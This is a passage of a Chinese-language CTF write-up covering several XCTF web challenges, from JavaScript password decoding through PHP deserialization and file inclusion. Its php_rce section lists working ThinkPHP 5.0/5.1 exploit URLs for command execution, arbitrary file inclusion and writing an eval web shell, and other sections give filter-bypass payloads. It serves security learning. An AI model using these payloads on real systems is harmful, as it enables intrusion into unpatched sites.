punctuation\">;</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                        k <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>n<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                        n <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                        o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token operator\">&amp;&amp;</span> i <span class=\"token operator\">&lt;</span> k<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                                        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span>tab2<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 这里只返回了部分字符</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        pass <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span><span class=\"token keyword\">return</span> pass<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    String<span class=\"token punctuation\">[</span><span class=\"token string\">\"fromCharCode\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 需要对比的密码</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    h <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">prompt</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Enter password'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>pass_enc**.split (**) 方法用于把一个字符串分割成字符串数组</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># ascii 转字符串</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hex_string <span class=\"token operator\">=</span> <span class=\"token string\">r\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>hex_values <span class=\"token operator\">=</span> hex_string<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>hex_value<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> hex_value <span class=\"token keyword\">in</span> hex_values<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ascii_values <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">55</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">79</span><span class=\"token punctuation\">,</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span><span class=\"token number\">69</span><span class=\"token punctuation\">,</span><span class=\"token number\">114</span><span class=\"token punctuation\">,</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">107</span><span class=\"token punctuation\">,</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> value <span class=\"token keyword\">in</span> ascii_values<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#55,56,54,79,115,69,114,116,107,49,50</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#786OsErtk12</span></pre></td></tr></table></figure><blockquote 786OsErtk12=\"\">\n<p>flag</p>\n</blockquote>\n<h2 id=\"baby_web\"><a class=\"markdownIt-Anchor\" href=\"#baby_web\">#</a> baby_web:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824221304273.png\" alt=\"image-20230824221304273\"></p>\n<p><img data-src=\"/img/webpic/image-20230824221335028.png\" alt=\"image-20230824221335028\"></p>\n<p>进入题目页面。初始页面一般是 index.php</p>\n<p>试着传入 index.php 试一下</p>\n<p>但是又回到 1.php</p>\n<p>用 burp 传一下试一下</p>\n<p><img data-src=\"/img/webpic/image-20230824221652725.png\" alt=\"image-20230824221652725\"></p>\n<p>成功找到 flag</p>\n<h2 id=\"php2\"><a class=\"markdownIt-Anchor\" href=\"#php2\">#</a> PHP2:&gt;</h2>\n<blockquote>\n<p>前置知识：</p>\n<p>phps 即为 PHP Source。</p>\n<p>phps 文件就是 php 的源代码文件，通常用于提供给用户（访问者）查看 php 代码，因为用户无法直接通过 Web 浏览器看到 php 文件的内容，所以需要用 phps 文件代替。其实，只要不用 php 等已经在服务器中注册过的 MIME 类型为文件即可，但为了国际通用，所以才用了 phps 文件类型</p>\n</blockquote>\n<p>这题 php 查看不了源码，只能用 phps 查看。</p>\n<p><img data-src=\"/img/webpic/image-20230824222125570.png\" alt=\"image-20230824222125570\"></p>\n<p>有点乱，用 burp 看一眼。</p>\n<p><img data-src=\"/img/webpic/image-20230824222253677.png\" alt=\"image-20230824222253677\"></p>\n<p>大概意思就是，GET 请求，如果 admin 等于传入的 id 在退出，但是下面可以通过 url 解码去绕过</p>\n<blockquote>\n<p>1, 只改变 a 即 %61dmin</p>\n<p>2, 全都改变 %61%64%6d%69%6e</p>\n</blockquote>\n<p>但是，进入网页可要 url 解码一次，所以 % 要改变 %25</p>\n<blockquote>\n<p>即最终的 payload 的为：?id=%2561%2564%256d%2569%256e</p>\n<p>​\t\t\t\t   \t\t\tor   ?id=%2561dmin</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824223440837.png\" alt=\"image-20230824223440837\"></p>\n<h2 id=\"ics-06\"><a class=\"markdownIt-Anchor\" href=\"#ics-06\">#</a> ics-06:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824223657576.png\" alt=\"image-20230824223657576\"></p>\n<p><img data-src=\"/img/webpic/image-20230824223722948.png\" alt=\"image-20230824223722948\"></p>\n<p>只有报表中心可以点</p>\n<p><img data-src=\"/img/webpic/image-20230824223808888.png\" alt=\"image-20230824223808888\"></p>\n<p>发现有 GET 传 id 的方式</p>\n<p>用 burp 抓下包看一下。（没有别的发现，只能对 id 爆破</p>\n<p><img data-src=\"/img/webpic/image-20230824224221045.png\" alt=\"image-20230824224221045\"></p>\n<p>这里添加 payload。</p>\n<p><img data-src=\"/img/webpic/image-20230824224258586.png\" alt=\"image-20230824224258586\"></p>\n<p>这样设置 payload，攻击！！</p>\n<p><img data-src=\"/img/webpic/image-20230824224459083.png\" alt=\"image-20230824224459083\"></p>\n<p>id=2333 异常。说明入侵者痕迹在这。</p>\n<p>查看响应包。</p>\n<p><img data-src=\"/img/webpic/image-20230824224825879.png\" alt=\"image-20230824224825879\"></p>\n<p>发现 flag</p>\n<h2 id=\"php_rce\"><a class=\"markdownIt-Anchor\" href=\"#php_rce\">#</a> php_rce:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824225156637.png\" alt=\"image-20230824225156637\"></p>\n<p>知识了解一下吧：</p>\n<blockquote>\n<p>1.ThinkPHP 简介：<br>\nThinkPHP 是一个开源，快速、简单的轻量级国产 PHP 开发框架，诞生于 2006 年初，原名 FCS，2007 年元旦正式更名为 ThinkPHP。使用面向对象的开发结构和 MVC 模式，融合了 Struts 的思想和 TagLib（标签库）、RoR 的 ORM 映射和 ActiveRecord 模式。</p>\n<p>ThinkPHP 可以支持 windows/Unix/Linux 等服务器环境，正式版需要 PHP 5.0 以上版本，支持 MySql、PgSQL、Sqlite 多种数据库以及 PDO 扩展，是一款跨平台，跨版本以及简单易用的 PHP 框架。</p>\n</blockquote>\n<p>其中 ThinkPHP 2 以及 ThinkPHP 3 系列已经停止维护，ThinkPHP 5 系列现使用最多，而 ThinkPHP 3 系列也积累了较多的历史用户。各个系列之间在代码实现及功能方面有较大区别。</p>\n<p>这是 PHP V5，找下 PHP V5 的漏洞。</p>\n<ul>\n<li>5.0.x：</li>\n</ul>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/think\\config/get&amp;name<span class=\"token operator\">=</span>database<span class=\"token punctuation\">.</span>username <span class=\"token comment\">// 获取配置信息</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Lang/load&amp;file<span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/test<span class=\"token punctuation\">.</span>jpg <span class=\"token comment\">// 包含任意文件</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Config/load&amp;file<span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/t<span class=\"token punctuation\">.</span>php <span class=\"token comment\">// 包含任意.php 文件</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>id <span class=\"token comment\">// 执行命令</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>/Index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>phpinfo&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">-1</span> <span class=\"token comment\">// 执行 phpinfo ();</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>/Index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>file_put_contents&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>shell<span class=\"token punctuation\">.</span>php&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php @eval<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span>\t<span class=\"token comment\">// 写入 shell</span></pre></td></tr></table></figure><ul>\n<li>5.1.x：</li>\n</ul>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Request/input&amp;filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;data<span class=\"token operator\">=</span><span class=\"token class-name\">pwd</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span></span>s<span class=\"token operator\">=</span>index/\\think\\view\\driver\\Php/display&amp;content<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name\">php</span> phpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\template\\driver\\file/write&amp;cacheFile<span class=\"token operator\">=</span>shell<span class=\"token punctuation\">.</span>php&amp;content<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php @eval<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Container/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token class-name\">id</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span></span>s<span class=\"token operator\">=</span>index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>id</pre></td></tr></table></figure><p>执行 5.0 的漏洞</p>\n<p><img data-src=\"/img/webpic/image-20230824225834486.png\" alt=\"image-20230824225834486\"></p>\n<p>发现当前目录没有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824230021454.png\" alt=\"image-20230824230021454\"></p>\n<p>根目录有 flag</p>\n<p><img data-src=\"/img/webpic/image-20230824230224897.png\" alt=\"image-20230824230224897\"></p>\n<p>得到 flag</p>\n<h2 id=\"unserialize3\"><a class=\"markdownIt-Anchor\" href=\"#unserialize3\">#</a> unserialize3:&gt;</h2>\n<p>反序列化：</p>\n<blockquote>\n<h3 id=\"什么是序列化serialize\"><a class=\"markdownIt-Anchor\" href=\"#什么是序列化serialize\">#</a> 什么是序列化 (serialize)</h3>\n<p>将对象的状态信息转换为可以存储或传输的形式的过程，简单来说，就是将状态信息保存为字符串</p>\n<h3 id=\"什么是反序列化unserialize\"><a class=\"markdownIt-Anchor\" href=\"#什么是反序列化unserialize\">#</a> 什么是反序列化 (unserialize)</h3>\n<p>将字符串转换为状态信息</p>\n<p>二、什么是反序列化漏洞</p>\n<p>当程序在进行反序列化时，会自动调用一些函数，例如_wakeup ()   _destruct () 等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。</p>\n</blockquote>\n<p>由于反序列化时 unserialize () 函数会自动调用 wakeup (),destruct (), 函数，当有一些漏洞或者恶意代码在这些函数中，当我们控制序列化的字符串时会去触发他们，从而达到攻击。</p>\n<blockquote>\n<p>__construct () : 构造函数，当创建对象时自动调用。</p>\n<p>__destruct (): 析构函数，在对象的所有引用都被删除时或者对象被显式销毁时调用，当对象被销毁时自动调用。</p>\n<p>__wakeup (): 进行 unserialize 时会查看是否有该函数，有的话有限调用。会进行初始化对象。遇到 unserialize () 时自动触发</p>\n<p>__ toString (): 当一个类被当成字符串时会被调用。</p>\n<p>__sleep (): 当一个对象被序列化时调用，可与设定序列化时保存的属性。</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>code<span class=\"token operator\">=</span></pre></td></tr></table></figure><p>这个题，需要去完善下代码。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span>                      <span class=\"token comment\">// 定义一个名为 xctf 的类</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// 定义一个公有的类属性 $flag，值为 111</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>      <span class=\"token comment\">// 定义一个公有的类方法__wakeup ()，输出 bad requests 后退出当前脚本</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$peak</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">xctf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 使用 new 运算符来实例化该类（xctf）的对象为 peak</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$peak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 输出被序列化的对象（peak）</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>执行下</p>\n<p><img data-src=\"/img/webpic/image-20230824231257800.png\" alt=\"image-20230824231257800\"></p>\n<blockquote>\n<p s:4:flag;s:3:111;=\"\">O:4:“xctf”:1:</p>\n<p>O 代表 object（为 A 时代表 Array），4 代表 &quot;test&quot; 占 4 个字符长度，1 代表着对象具有一个变量：flag，s 代表 string，字符型（如果为 i，代表 int 型）</p>\n<p>里面的值是不可修改的，但是可以修改的属性 (变量) 数大于实际的个数时，就可以绕过 wakeup</p>\n</blockquote>\n<p>所以 payload 为</p>\n<blockquote s:4:flag;s:3:111;=\"\">\n<p>?code=O:4:“xctf”:2:</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824231621861.png\" alt=\"image-20230824231621861\"></p>\n<h2 id=\"web_php_include\"><a class=\"markdownIt-Anchor\" href=\"#web_php_include\">#</a> Web_php_include:&gt;</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 显示当前文件的源代码</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'hello'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 输出名为 'hello' 的 GET 参数的值</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 将名为 'page' 的 GET 参数的值赋给变量 $page</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 当 $page 中包含 \"php://\" 时执行循环</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 将 $page 中的所有 \"php://\" 替换为空字符串</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 包含并执行 $page 对应的文件</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><blockquote>\n<p>由于这段代码对用户输入的  <code>$page</code>  参数直接进行了  <code>include</code> ，存在安全风险。未经验证的用户输入可能导致远程文件包含（RFI）攻击或代码注入漏洞。</p>\n</blockquote>\n<blockquote>\n<p>一、文件包含漏洞分类</p>\n<p>LFI(Local File Inclusion)<br>\n 本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是 LFI。<br>\n为了方便本文把 LFI 直接称为文件包含漏洞。</p>\n<p>RFI(Remote File Inclusion)<br>\n 